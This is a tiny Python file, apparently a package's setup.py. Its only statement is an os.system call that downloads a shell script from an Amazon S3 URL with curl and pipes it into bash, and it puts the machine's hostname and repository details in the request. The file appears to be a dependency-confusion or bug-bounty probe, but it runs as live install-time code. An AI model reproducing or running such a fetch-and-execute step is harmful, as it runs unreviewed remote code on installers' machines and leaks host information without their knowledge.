
import os

os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/mkrepo.git\&folder=mkrepo\&hostname=`hostname`\&foo=tae\&file=setup.py')
